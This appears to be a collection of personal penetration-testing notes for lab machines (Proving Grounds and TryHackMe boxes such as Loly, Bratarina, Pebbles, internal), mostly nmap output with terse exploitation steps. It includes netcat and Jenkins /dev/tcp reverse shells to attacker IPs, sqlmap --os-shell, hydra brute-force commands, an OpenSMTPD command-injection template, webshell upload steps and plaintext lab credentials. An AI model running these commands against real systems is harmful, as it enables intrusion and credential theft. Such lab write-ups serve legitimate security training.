<br />| fingerprint-strings:                                                                                                               <br />|   FourOhFourRequest:                                                                                                               <br />|     HTTP/1.1 404 Not Found                                                                                                         <br />|     X-DNS-Prefetch-Control: off                                                                                                    <br />|     X-Frame-Options: SAMEORIGIN                                                                                                    <br />|     X-Download-Options: noopen                                                                                                     <br />|     X-Content-Type-Options: nosniff                                                                                                <br />|     X-XSS-Protection: 1; mode=block                                                                                                <br />|     Referrer-Policy: strict-origin-when-cross-origin                                                                               <br />|     X-Powered-By: NodeBB                                                                                                           <br />|     set-cookie: _csrf=QdBtWY3LKvKT_1iL1Gf3mcic; Path=/                                                                             <br />|     Content-Type: text/html; charset=utf-8                                                                                         <br />|     Content-Length: 11098                                                                                                          <br />|     ETag: W/&quot;2b5a-Fxz04/ANICqTPXCTdZBI3C5wGqw&quot;                                                                                     <br />|     Vary: Accept-Encoding                                                                                                          <br />|     Date: Tue, 21 Sep 2021 21:57:00 GMT                                                                                            <br />|     Connection: close                                                                                                              <br />|     &lt;!DOCTYPE html&gt;                                                                                                                <br />|     &lt;html lang=&quot;en-GB&quot; data-dir=&quot;ltr&quot; style=&quot;direction: ltr;&quot; &gt;                                                                    <br />|     &lt;head&gt;                                                                                                                         <br />|     &lt;title&gt;Not Found | NodeBB&lt;/title&gt;                                                                                              <br />|     &lt;meta name=&quot;viewport&quot; content=&quot;width&amp;#x3D;device-width, initial-scale&amp;#x3D;1.0&quot; /&gt;                                             <br />|     &lt;meta name=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;                                                                <br />|     &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;                                                                     <br />|     &lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;                                                                           <br />|     &lt;meta property=&quot;og:site_n                                                                                                      <br />|   GetRequest:                                                <br />|     HTTP/1.1 200 OK                                          <br />|     X-DNS-Prefetch-Control: off                                                                                              <br />|     X-Frame-Options: SAMEORIGIN                                                                                              <br />|     X-Download-Options: noopen                               <br />|     X-Content-Type-Options: nosniff                                                                                          <br />|     X-XSS-Protection: 1; mode=block                                                                                          <br />|     Referrer-Policy: strict-origin-when-cross-origin                                                                         <br />|     X-Powered-By: NodeBB                                     <br />|     set-cookie: _csrf=LHb2PZSmsaPCRk9X6b8YnLMv; Path=/                                                                       <br />|     Content-Type: text/html; charset=utf-8                                                                                   <br />|     Content-Length: 18181                                    <br />|     ETag: W/&quot;4705-j4ipv+cNyzWfz7U9kLDaHmEntOM&quot;                                                                               <br />|     Vary: Accept-Encoding                                    <br />|     Date: Tue, 21 Sep 2021 21:56:59 GMT                                                                                      <br />|     Connection: close                                        <br />|     &lt;!DOCTYPE html&gt;                                          <br />|     &lt;html lang=&quot;en-GB&quot; data-dir=&quot;ltr&quot; style=&quot;direction: ltr;&quot; &gt;                                                              <br />|     &lt;head&gt;                                                   <br />&lt;title&gt;Not Found | NodeBB&lt;/title&gt;                                                                                                                                                                                                                       <br />|     &lt;meta name=&quot;viewport&quot; content=&quot;width&amp;#x3D;device-width, initial-scale&amp;#x3D;1.0&quot; /&gt;                                                                                                                                                                      <br />|     &lt;meta name=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;                                                                                                                                                                                         <br />|     &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;                                                                                                                                                                                              <br />|     &lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;                                                                                                                                                                                                    <br />|     &lt;meta property=&quot;og:site_n                                                                                                                                                                                                                               <br />|   GetRequest:                                                                                                                                                                                                                                               <br />|     HTTP/1.1 200 OK                                                                                                                                                                                                                                         <br />|     X-DNS-Prefetch-Control: off                                                                                                                                                                                                                             <br />|     X-Frame-Options: SAMEORIGIN                                                                                              <br />|     X-Download-Options: noopen                               <br />|     X-Content-Type-Options: nosniff                                                                                          <br />|     X-XSS-Protection: 1; mode=block                                                                                          <br />|     Referrer-Policy: strict-origin-when-cross-origin                                                                         <br />|     X-Powered-By: NodeBB                                     <br />|     set-cookie: _csrf=LHb2PZSmsaPCRk9X6b8YnLMv; Path=/                                                                       <br />|     Content-Type: text/html; charset=utf-8                                                                                   <br />|     Content-Length: 18181                                    <br />|     ETag: W/&quot;4705-j4ipv+cNyzWfz7U9kLDaHmEntOM&quot;                                                                               <br />|     Vary: Accept-Encoding                                    <br />|     Date: Tue, 21 Sep 2021 21:56:59 GMT                                                                                      <br />|     Connection: close                                        <br />|     &lt;!DOCTYPE html&gt;                                          <br />|     &lt;html lang=&quot;en-GB&quot; data-dir=&quot;ltr&quot; style=&quot;direction: ltr;&quot; &gt;                                                              <br />|     &lt;head&gt;                                                   <br />|     &lt;title&gt;Home | NodeBB&lt;/title&gt;                                                                                             <br />|     &lt;meta name=&quot;viewport&quot; content=&quot;width&amp;#x3D;device-width, initial-scale&amp;#x3D;1.0&quot; /&gt;                                                                                                                                                                      <br />|     &lt;meta name=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;                                                                                                                                                                                         <br />|     &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;                                                               <br />|     &lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;                                                                     <br />|     &lt;meta property=&quot;og:site_name&quot; content                                                                                    <br />|   HTTPOptions:                                               <br />|     HTTP/1.1 200 OK                                          <br />|     X-DNS-Prefetch-Control: off                                                                                              <br />|     X-Frame-Options: SAMEORIGIN                                                                                              <br />|     X-Download-Options: noopen                               <br />|     X-Content-Type-Options: nosniff                                                                                          <br />|     X-XSS-Protection: 1; mode=block                                                                                          <br />|     Referrer-Policy: strict-origin-when-cross-origin                                                                         <br />|     X-Powered-By: NodeBB                                     <br />|     Allow: GET,HEAD                                          <br />|     Content-Type: text/html; charset=utf-8                                                                                   <br />|     Content-Length: 8                                        <br />|     ETag: W/&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg&quot;                                                                                  <br />|     Vary: Accept-Encoding                                    <br />|     Date: Tue, 21 Sep 2021 21:56:59 GMT                                                                                      <br />|     Connection: close                                        <br />|     GET,HEAD                                                 <br />|   RTSPRequest:                                               <br />|     HTTP/1.1 400 Bad Request                                 <br />|_    Connection: close                                        <br />| http-robots.txt: 3 disallowed entries                                                                                        <br />|_/admin/ /reset/ /compose                                     <br />|_http-title: Home | NodeBB                                    <br />27017/tcp open   mongodb    MongoDB 4.0.18                 <br />fingerprint-strings:                                         <br />|   GetRequest:                                                <br />|     HTTP/1.0 200 OK                                          <br />|     Connection: close                                        <br />|     Content-Type: text/plain                                 <br />|     Content-Length: 85                                       <br />|     looks like you are trying to access MongoDB over HTTP on the native driver port.                                                                                                                                                                        <br />|   mongodb:                                                   <br />|     errmsg                                                   <br />|     command serverStatus requires authentication                                                                             <br />|     code                                                     <br />|     codeName                                                 <br />|_    Unauthorized                                             <br />| mongodb-databases:                                           <br />|   ok = 0.0                                                   <br />|   codeName = Unauthorized                                    <br />|   errmsg = command listDatabases requires authentication                                                                     <br />|_  code = 13                                                  <br />| mongodb-info:                                                <br />|   MongoDB Build info                                         <br />|     versionArray                                             <br />|       1 = 0                                                  <br />|       0 = 4                                                  <br />|       3 = 0                                                  <br />|       2 = 18                                                 <br />|     openssl                                                  <br />|       running = OpenSSL 1.1.0l  10 Sep 2019                                                                                  <br />|       compiled = OpenSSL 1.1.0l  10 Sep 2019                                                                                 <br />|     version = 4.0.18                                         <br />|     ok = 1.0                                                 <br />|     storageEngines                                           <br />|       1 = ephemeralForTest                                   <br />|       0 = devnull                                            <br />|       3 = wiredTiger                                         <br />|       2 = mmapv1                                             <br />|     maxBsonObjectSize = 16777216                                                                                             <br />|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67                                                                    <br />|     debug = false                                            <br />|     bits = 64                                                <br />|     buildEnvironment                                         <br />|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro<br />|       target_os = linux                                      <br />|       distmod = debian92                                     <br />|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0                                                                <br />|       target_arch = x86_64                                   <br />|       distarch = x86_64                                      <br />|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -W<br />no-missing-braces -fstack-protector-strong -fno-builtin-memcmp<br />|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0                                                                 <br />|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14                                                                                                                                                                                   <br />|     modules                                                  <br />|     javascriptEngine = mozjs                                 <br />|     sysInfo = deprecated                                     <br />|     allocator = tcmalloc                                     <br />|   Server status                                              <br />|     ok = 0.0                                                 <br />|     codeName = Unauthorized                                  <br />|     errmsg = command serverStatus requires authentication                                                                    <br />|_    code = 13                                                <br /><br /><br />msfconsole<br /><br />MAKE SURE LISTENING PORT IS 8080 or 80</div><div class='page'><h1 class='title level-2'>Loly.pg</h1><br/>PORT   STATE SERVICE REASON         VERSION                                                                                   │                                                                                                                         130 ⨯<br />80/tcp open  http    syn-ack ttl 63 nginx 1.10.3 (Ubuntu)                                                                     │Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-16 23:04 +03<br />| http-methods:                                                                                                               │<br />|_  Supported Methods: GET HEAD                                                                                               │<br />|_http-server-header: nginx/1.10.3 (Ubuntu)                                                                                   │<br />|_http-title: Welcome to nginx!             <br /><br /><br />wpscan enum ⇒ find loly user ⇒ wpscan bruteforce pass with rockyou.txt<br /><br />loly:fernando<br /><br />go to admin/adrotate ⇒ upload file make it shell.php.zip go to /wp-content/banners/shell.php<br /><br />find dbpass in wp-config.php<br /><br />loly:lolyisabeautifulgirl<br /><br />su loly<br /><br />linpeas ⇒ old kernel version<br /><br /><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br /><br />root                      </div><div class='page'><h1 class='title level-2'>Bratarina.pg</h1><br/>PORT    STATE SERVICE     REASON         VERSION<br />22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey:                                                 <br />|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJ0GZmmFtQUJbj2HgPsye2Xccyyh9mC8fsCwIivM4x3o3mwZDNi6g+Y6nIs5SuOJj2IpS+E9O5wB71MSIv7d7XYrd6paprfvnvMCyAQ9VTn8py6CQ/OsgeOITU+JnAxoe3WQklpyAVqhJ7ASqAInZF8oHDaebr6gBKEq4nkoLOtJSZeB8xWDHhbQZjG6AY81Y2mHPZH/LC4gSXpSmw+3h0<br />zhlCN/kxeyhjrsrZqIVdKhg4emds8+gQyu1Wrz4AUUBGscI6Sh5rjImr+SC4rAGgn6N0MVPcZA1mS0JUplz758Y3YFXstqO2SdaHB/Qb50fkcpclcYKibSbCv5ZLNzOf<br />|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA) <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOWgZAzhJ+plc4Rk/YyGvQ1KOKK9j31ix1uCWIAirjnZS/lKwcvYrkG+lVsJRBnBYVA+67ILSJR2YNVz9uZshPE=<br />|   256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2Z9krPXlbEN6Xl40sc3BiVLfhbtd+l5ZFNBKkF7pYT<br />25/tcp  open  smtp        syn-ack ttl 63 OpenSMTPD<br />| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.146], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, <br />|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info <br />80/tcp  open  http        syn-ack ttl 63 nginx 1.14.0 (Ubuntu)<br />|_http-server-header: nginx/1.14.0 (Ubuntu)<br />|_http-title:         Page not found - FlaskBB        <br />445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />Device type: VoIP adapter|general purpose<br />Running: Cisco embedded, Linux 2.6.X<br />OS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26<br />OS details: Cisco Unified Communications Manager VoIP adapter, Linux 2.6.26 (PCLinuxOS)<br /><br /><br />└─# cat passwd.bak                                                                                                            <br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                              <br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin                                   <br />systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin                                           <br />syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br />messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br />_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br />lxd:x:105:65534::/var/lib/lxd/:/bin/false<br />uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br />dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br />landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br />sshd:x:109:65534::/run/sshd:/usr/sbin/nologin<br />pollinate:x:110:1::/var/cache/pollinate:/bin/false<br />neil:x:1000:1000:neil,,,:/home/neil:/bin/bash<br />_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin<br />_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin<br />postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash          <br /><br />OPEN SMTPD<br /><br />HELO whiskey<br />MAIL FROM:&lt;;CMD HERE;&gt;<br />RCPT TO:&lt;neil&gt;<br />DATA<br /><br />xxxxxxx<br />.<br /><br />  <br /><br />reverse shell with python<br /><br />only 80 and 445 you can get reverse shell<br /><br /><br /></div><div class='page'><h1 class='title level-2'>hawat.pg</h1><br/><br /><br /><br /><br />user:clinton<br /><br /><br /><br /><br /><br /><br /><br /><br />spring.datasource.url=jdbc:mysql://localhost:3306/issue_tracker?serverTimeZone=UTC<br />spring.datasource.username=issue_user<br />spring.datasource.password=ManagementInsideOld797<br />spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver<br /><br />spring.jpa.hibernate.ddl-auto=update<br />server.port=17445<br /><br /><br /></div><div class='page'><h1 class='title level-2'>payday.pg</h1><br/>22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)                                                                                                                                                                                         <br />| ssh-hostkey:                                                                                                                                                                                                                                                <br />|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)                                                                                                                                                                                                <br />|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)                                                                                                                                                                                                <br />80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)                                                                                                                                                                                    <br />|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6                                                                                                                                                                                                <br />|_http-title: CS-Cart. Powerful PHP shopping cart software                                                                                                                                                                                                    <br />110/tcp open  pop3        Dovecot pop3d                                                                                                                                                                                                                       <br />|_pop3-capabilities: UIDL STLS PIPELINING CAPA RESP-CODES SASL TOP                                                                                                                                                                                            <br />|_ssl-date: 2021-10-02T18:15:47+00:00; +6s from scanner time.                                                                                                                                                                                                 <br />| sslv2:                                                                                                                                                                                                                                                      <br />|   SSLv2 supported                                                                                                                                                                                                                                           <br />|   ciphers:                                                   <br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|_    SSL2_RC4_128_WITH_MD5                                    <br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)<br />143/tcp open  imap        Dovecot imapd<br />|_imap-capabilities: IMAP4rev1 LOGINDISABLEDA0001 SASL-IR LITERAL+ MULTIAPPEND Capability UNSELECT STARTTLS SORT IDLE OK CHILDREN THREAD=REFERENCES LOGIN-REFERRALS completed NAMESPACE<br />|_ssl-date: 2021-10-02T18:15:47+00:00; +6s from scanner time.<br />| sslv2:                                                       <br />|   SSLv2 supported                                            <br />|   ciphers:                                                   <br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|_    SSL2_RC4_128_WITH_MD5                                    <br />445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)<br />993/tcp open  ssl/imaps?                                       <br />| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX<br />| Not valid before: 2008-04-25T02:02:48<br />|_Not valid after:  2008-05-25T02:02:48<br />|_ssl-date: 2021-10-02T18:15:47+00:00; +7s from scanner time.<br />| sslv2:                                                       <br />|   SSLv2 supported                                            <br />|   ciphers:                                                   <br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|_    SSL2_RC4_128_WITH_MD5                                    <br />995/tcp open  ssl/pop3s?                                       <br />| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX<br />| Not valid before: 2008-04-25T02:02:48<br />|_Not valid after:  2008-05-25T02:02:48<br />|_ssl-date: 2021-10-02T18:15:48+00:00; +7s from scanner time.<br />| sslv2:                                                       <br />|   SSLv2 supported                                            <br />|   ciphers:                                                   <br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|_    SSL2_RC4_128_WITH_MD5                                    <br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br /><br /><a href="http://192.168.89.39/admin">http://192.168.89.39/admin</a><br /><br />admin:admin<br />go to Look and Feel ⇒ Template Editor<br /><br />php reverse shell ⇒ whiskey.phtml upload to get a reverse shell.<br /><br />guess patrick&#39;s password<br /><br />patrick:patrick<br /><br />sudo -l<br /><br />ALL:ALL<br />sudo su<br /><br />whoami<br />root</div><div class='page'><h1 class='title level-2'>Pebbles.pg</h1><br/><br />Nmap scan report for 192.168.178.52<br />Host is up (0.14s latency).<br />Not shown: 65530 filtered ports<br />PORT     STATE SERVICE VERSION<br />21/tcp   open  ftp     vsftpd 3.0.3<br />22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)<br />|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)<br />|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)<br />80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Pebbles<br />3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-favicon: Apache Tomcat<br />| http-open-proxy: Potentially OPEN proxy.<br />|_Methods supported:CONNECTION<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Tomcat<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />limit parameter has time based sql injection<br /><a href="https://www.exploit-db.com/exploits/41239">https://www.exploit-db.com/exploits/41239</a><br /><br />= <a href="http://192.168.178.52/zm/index.php">http://192.168.178.52/zm/index.php</a> --data=&quot;view=request&amp;request=log&amp;task=query&amp;<strong><span style="color:#ffff00;">limit</span></strong>=100&amp;minTime=5&quot; --os-shell<br /><br />admin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441 (admin:admin)<br /><br /><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.49.178 53 &gt;/tmp/f<br /><br />whoami<br />root</div><div class='page'><h1 class='title level-2'>internal.pg</h1><br/>─# nmap -A 10.10.66.242 -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-09 02:19 +03<br />Nmap scan report for 10.10.66.242<br />Host is up (0.080s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)<br />|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)<br />|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)<br />80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/9%OT=22%CT=1%CU=38460%PV=Y%DS=2%DC=T%G=Y%TM=60971E9A<br />OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)OPS(O1=M5<br />OS:05ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O<br />OS:6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D<br />OS:F=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0<br />OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=<br />OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%<br />OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I<br />OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 80/tcp)<br />HOP RTT      ADDRESS<br />1   79.35 ms 10.11.0.1<br />2   80.77 ms 10.10.66.242<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 520.18 seconds<br /><br /><br /><br /><br /><br /><br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt http://intenal.thm http-post-form &quot;/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:incorrect&quot;<br /><br /><br /><br /><br />/blog/wp-login.php<br />log=admin&amp;pwd=test&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1<br /><br /><br />[80][http-post-form] host: 10.10.66.242   login: admin   password: my2boys<br /><br /><br />internal.thm/blog/wp-content/themes/twentyseventeen/404.php ⇒ buraya shell yaz admin panelden<br /><br /><a href="http://internal.thm/phpmyadmin/">http://internal.thm/phpmyadmin/</a><br />wordpress<br />wordpress123<br /><br />$dbuser=&#39;phpmyadmin&#39;;<br />$dbpass=&#39;B2Ud4fEOZmVq&#39;;<br /><br /><br />cat /opt/wp-save.txt<br />Bill,<br /><br />Aubreanna needed these credentials for something later.  Let her know you have them and where they are.<br /><br />aubreanna:bubb13guM!@#123<br /><br /><br /><br /><strong>Kendi kalinden 127.0.0.1:8080 uzaktaki bilgisayar, 10000 ise senin local portun!</strong><br />┌──(root💀kali)-[/home/kali/Desktop]<br />└─# ssh -L 10000:127.0.0.1:8080 -f -N aubreanna@10.10.66.242<br /><br /><br />127.0.0.1:10000<br />/j_acegi_security_check <br /><br />j_username=admin&amp;j_password=test&amp;from=%2F&amp;Submit=Sign+in<br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 10000 http-post-form &quot;/j_acegi_security_check :j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid&quot;<br /><br />[10000][http-post-form] host: 127.0.0.1   login: admin   password: spongebob<br /><br />jenkins interactive shell<br /><br />Script Console<br /><br />r = Runtime.getRuntime()<br />p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.11.17.106/6666;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])<br />p.waitFor()<br /><br /><br />/bin/bash -i<br /><br /><br /><br />cat /opt/note.txt<br /><br />root:tr0ub13guM!@#123</div><div class='page'><h1 class='title level-2'>helpdesk.pg</h1><br/>Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-25 22:26 +03                  <br />Nmap scan report for 192.168.62.43                                               <br />Host is up (0.16s latency).                                                      <br />Not shown: 65530 filtered ports                                                  <br />PORT     STATE SERVICE       VERSION                                             <br />135/tcp  open  msrpc         Microsoft Windows RPC                               <br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                       <br />445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)<br />3389/tcp open  ms-wbt-server Microsoft Terminal Service                          <br />8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1                 <br />| http-cookie-flags:                                                             <br />|   /:                                                                           <br />|     JSESSIONID:                                                                <br />|_      httponly flag not set<br />|_http-server-header: Apache-Coyote/1.1<br />|_http-title: ManageEngine ServiceDesk Plus<br />Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2<br /><br /><br />default credentials ⇒ administrator:administrator<br /><br /><a href="https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py">https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py</a><br /><br /><br /><h3>MS09_050</h3><br />Alternatively, since the target machine is running Windows Server 2008 sp1 32-bit, we could use the <code>ms09_050_smb2_negotiate_func_index1</code> Metasploit Framework module.<br /><code>msf6 exploit(multi/http/manageengine_auth_upload) &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code><br /><br /></div><div class='page'><h1 class='title level-2'>interface.pg</h1><br/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br 